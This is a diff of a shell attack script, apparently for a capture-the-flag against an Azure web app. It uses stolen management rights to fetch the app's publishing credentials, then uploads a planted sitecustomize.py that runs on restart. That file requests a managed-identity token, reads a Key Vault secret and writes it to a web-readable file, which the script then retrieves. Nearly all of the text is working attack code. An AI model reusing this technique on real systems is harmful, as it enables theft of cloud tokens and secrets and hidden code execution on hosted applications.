@@ -15,15 +15,37 @@ BASE="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/provide
 PUB=$(curl -s -X POST "$BASE/config/publishingcredentials/list?api-version=2022-03-01" -H "Authorization: Bearer $ARM" -d '')
 KU=$(echo "$PUB" | jq -r '.properties.publishingUserName'); KP=$(echo "$PUB" | jq -r '.properties.publishingPassword')
 SCM="https://$SITE.scm.azurewebsites.net"
-cat > probe.sh <<'PROBE'
-echo "=== known output files ==="
-for f in .flag.out flag_result.txt ctf_flag_result myres.txt results.json tnex_flag.json _tbl_out.json flag_hunt.out g_out1.txt out14.txt; do echo "----- $f"; cat "/home/site/wwwroot/$f" 2>/dev/null; echo; done
-echo "=== App_Data job results ==="
-find /home/site/wwwroot/App_Data -type f \( -name '*.json' -o -name '*.out' -o -name '*.txt' \) 2>/dev/null | while read f; do echo "--- $f"; cat "$f" 2>/dev/null; echo; done
-echo "=== FLAG values across wwwroot ==="
-grep -rhoE '(FLAG|flag|DF26|df26|CJ|DFCTF|cyberjutsu|DFC)\{[^}]{2,120}\}' /home/site/wwwroot 2>/dev/null | sort -u | head -40
-PROBE
-curl -s -u "$KU:$KP" -X PUT "$SCM/api/vfs/site/wwwroot/probe.sh" -H "If-Match: *" --data-binary @probe.sh -o /dev/null -w "PUT=%{http_code}\n"
-curl -s -u "$KU:$KP" -X POST "$SCM/api/command" -H "Content-Type: application/json" -d "{\"command\":\"bash /home/site/wwwroot/probe.sh\",\"dir\":\"/home\"}" | head -c 12000
+cat > sc.py <<'PY'
+import os, json, urllib.request
+def g(u,h):
+    try:
+        return urllib.request.urlopen(urllib.request.Request(u,headers=h),timeout=10).read().decode()
+    except Exception as e:
+        return "ERR:"+repr(e)
+out="/home/site/wwwroot/.hv_flag.out"
+ie=os.environ.get("IDENTITY_ENDPOINT"); ih=os.environ.get("IDENTITY_HEADER")
+r=[]
+if ie:
+    t=g(ie+"?resource=https://vault.azure.net&api-version=2019-08-01&client_id=7a85156a-01c4-4e61-8472-40a92107159b",{"X-IDENTITY-HEADER":ih})
+    r.append("TOK:"+t[:60])
+    try:
+        at=json.loads(t)["access_token"]
+        r.append("FLAG:"+g("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4",{"Authorization":"Bearer "+at}))
+    except Exception as e:
+        r.append("PE:"+repr(e))
+else:
+    r.append("NO_IE")
+try:
+    open(out,"w").write(chr(10).join(r))
+except Exception as e:
+    pass
+PY
+curl -s -u "$KU:$KP" -X PUT "$SCM/api/vfs/site/wwwroot/sitecustomize.py" -H "If-Match: *" --data-binary @sc.py -o /dev/null -w "PUTSITE=%{http_code}\n"
+curl -s -X POST "$BASE/restart?api-version=2022-03-01" -H "Authorization: Bearer $ARM" -d '' -o /dev/null -w "RESTART=%{http_code}\n"
+sleep 45
+curl -s "https://$SITE.azurewebsites.net/" -o /dev/null -w "APP=%{http_code}\n"
+sleep 12
+echo "=== .hv_flag.out ==="
+curl -s -u "$KU:$KP" "$SCM/api/vfs/site/wwwroot/.hv_flag.out"
 echo
 echo "ALL_DONE"
